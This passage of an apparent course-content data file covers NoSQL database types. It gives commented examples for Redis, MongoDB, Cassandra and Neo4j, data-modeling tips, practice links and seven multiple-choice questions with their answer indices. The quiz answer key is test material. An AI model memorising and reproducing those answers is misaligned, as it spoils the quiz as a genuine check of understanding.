  redis_client.INCR("api:user1001:minute");
  redis_client.EXPIRE("api:user1001:minute", 60);
  int count = redis_client.GET("api:user1001:minute");
  if (count > 100) reject_request();
*/

// ===== 2. DOCUMENT: MongoDB operations =====
// Best for: user profiles, content, catalogs, event logging

// Insert
// db.users.insertOne({
//   name: "Alice", age: 30,
//   address: { city: "NYC" },
//   tags: ["premium", "active"]
// })

// Query with filters
// db.users.find({ age: { $gte: 25 }, "address.city": "NYC" })

// Aggregation pipeline
// db.orders.aggregate([
//   { $match: { status: "completed" } },
//   { $group: { _id: "$customer_id", total: { $sum: "$amount" } } },
//   { $sort: { total: -1 } },
//   { $limit: 10 }
// ])

// ===== 3. COLUMN-FAMILY: Cassandra CQL =====
// Best for: time-series, IoT, write-heavy, multi-datacenter

// CREATE TABLE user_activity (
//   user_id UUID,
//   activity_date DATE,
//   activity_time TIMESTAMP,
//   action TEXT,
//   PRIMARY KEY ((user_id, activity_date), activity_time)
// ) WITH CLUSTERING ORDER BY (activity_time DESC);
//
// -- Partition key: (user_id, activity_date) → one partition per user per day
// -- Query: "all activities for user X on date Y" is a single partition read

// ===== 4. GRAPH: Neo4j Cypher =====
// Best for: social networks, recommendations, fraud detection

// Shortest path between two people:
// MATCH path = shortestPath(
//   (a:Person {name:"Alice"})-[:KNOWS*..6]-(b:Person {name:"Eve"})
// )
// RETURN path

// Recommendation: "People who bought X also bought Y"
// MATCH (u:User)-[:BOUGHT]->(p:Product {name:"Laptop"})
//       -[:BOUGHT_WITH]->(rec:Product)
// WHERE NOT (u)-[:BOUGHT]->(rec)
// RETURN rec.name, COUNT(*) as score ORDER BY score DESC

// ===== DATA MODELING PATTERNS =====

// Embedding vs Referencing (MongoDB):
// EMBED when: 1:1 or 1:few, data read together, atomic updates needed
// REFERENCE when: 1:many (unbounded), data updated independently, many:many

// Denormalization (Cassandra):
// Model tables around your QUERIES, not your entities
// Duplicate data across tables to avoid JOINs
// One table per query pattern is the norm`,
          problems: [
            ['NoSQL Database Types', 'https://www.geeksforgeeks.org/types-of-nosql-databases/', 'Easy'],
            ['SQL vs NoSQL', 'https://www.geeksforgeeks.org/difference-between-sql-and-nosql/', 'Easy']
          ],
          mcqs: [
            {q: 'Which NoSQL database type is best for representing social network relationships?', o: ['Key-Value', 'Document', 'Column-Family', 'Graph'], a: 3},
            {q: 'Redis primarily operates as a:', o: ['Document store', 'Column-family store', 'In-memory key-value store', 'Graph database'], a: 2},
            {q: 'In MongoDB, embedding a subdocument is preferred when:', o: ['The relationship is many-to-many', 'Data is always read together and has a 1:few relationship', 'The subdocument grows unboundedly', 'Data needs to be updated independently'], a: 1},
            {q: 'BASE stands for:', o: ['Basic ACID, Soft Events', 'Basically Available, Soft state, Eventually consistent', 'Basic Availability, Strong Encryption', 'Batch Access, Sequential Execution'], a: 1},
            {q: 'Cassandra\'s partition key determines:', o: ['Which column family to use', 'The sort order within a partition', 'Which node stores the data via consistent hashing', 'The replication factor'], a: 2},
            {q: 'In a graph database, traversing a relationship is:', o: ['O(n) where n is total nodes', 'O(log n) using index lookup', 'O(1) per hop regardless of total data size', 'O(n^2) for bidirectional edges'], a: 2},
            {q: 'Which Redis data structure is best suited for implementing a leaderboard?', o: ['Hash', 'List', 'Set', 'Sorted Set'], a: 3}
          ]
        }
      ]
    }
  ]
};
